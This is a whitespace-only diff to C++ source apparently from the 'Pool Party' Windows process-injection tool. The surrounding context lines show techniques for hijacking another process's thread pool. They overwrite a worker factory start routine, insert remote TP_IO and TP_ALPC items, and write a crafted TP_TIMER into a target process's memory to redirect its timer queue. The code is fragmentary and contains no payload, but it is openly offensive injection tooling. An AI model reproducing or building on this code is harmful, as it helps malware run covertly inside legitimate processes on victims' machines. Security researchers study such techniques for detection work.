@@ -95,7 +95,7 @@ void WorkerFactoryStartRoutineOverwrite::HijackHandles()
 LPVOID WorkerFactoryStartRoutineOverwrite::AllocateShellcodeMemory() const
 {
 	BOOST_LOG_TRIVIAL(info) << "Skipping shellcode allocation, using the target process worker factory start routine";
-	return m_WorkerFactoryInformation.StartRoutine; 
+	return m_WorkerFactoryInformation.StartRoutine;
 }
 
 void WorkerFactoryStartRoutineOverwrite::SetupExecution() const
@@ -185,9 +185,9 @@ void RemoteTpIoInsertion::SetupExecution() const
 	const auto p_hFile = w_CreateFile(
 		POOL_PARTY_FILE_NAME,
 		GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
-		nullptr, 
-		CREATE_ALWAYS, 
-		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, 
+		nullptr,
+		CREATE_ALWAYS,
+		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
 		nullptr);
 	BOOST_LOG_TRIVIAL(info) << boost::format("Created pool party file: `%s`") % g_WideString_Converter.to_bytes(POOL_PARTY_FILE_NAME);
 
@@ -247,7 +247,7 @@ void RemoteTpAlpcInsertion::SetupExecution() const
 
 	const auto hAlpcConnectionPort = w_NtAlpcCreatePort(&AlpcObjectAttributes, &AlpcPortAttributes);
 	BOOST_LOG_TRIVIAL(info) << boost::format("Created pool party ALPC port `%s`: %d") % g_WideString_Converter.to_bytes(POOL_PARTY_ALPC_PORT_NAME) % hAlpcConnectionPort;
-	
+
 	const auto pRemoteTpAlpc = static_cast<PFULL_TP_ALPC>(w_VirtualAllocEx(*m_p_hTargetPid, sizeof(FULL_TP_ALPC), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
 	BOOST_LOG_TRIVIAL(info) << boost::format("Allocated TP_ALPC memory in the target process: %p") % pRemoteTpAlpc;
 	w_WriteProcessMemory(*m_p_hTargetPid, pRemoteTpAlpc, pTpAlpc, sizeof(FULL_TP_ALPC));
@@ -375,16 +375,16 @@ void RemoteTpTimerInsertion::SetupExecution() const
 
 	w_WriteProcessMemory(*m_p_hTargetPid, RemoteTpTimerAddress, pTpTimer, sizeof(FULL_TP_TIMER));
 	BOOST_LOG_TRIVIAL(info) << "Written the specially crafted TP_TIMER structure to the target process";
-	
+
 	auto TpTimerWindowStartLinks = &RemoteTpTimerAddress->WindowStartLinks;
-	w_WriteProcessMemory(*m_p_hTargetPid, 
+	w_WriteProcessMemory(*m_p_hTargetPid,
 		&pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowStart.Root,
 		reinterpret_cast<PVOID>(&TpTimerWindowStartLinks),
 		sizeof(TpTimerWindowStartLinks));
 
 	auto TpTimerWindowEndLinks = &RemoteTpTimerAddress->WindowEndLinks;
-	w_WriteProcessMemory(*m_p_hTargetPid, 
-		&pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowEnd.Root, 
+	w_WriteProcessMemory(*m_p_hTargetPid,
+		&pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowEnd.Root,
 		reinterpret_cast<PVOID>(&TpTimerWindowEndLinks),
 		sizeof(TpTimerWindowEndLinks));
 	BOOST_LOG_TRIVIAL(info) << "Modified the target process's TP_POOL tiemr queue WindowsStart and WindowsEnd to point to the specially crafted TP_TIMER";
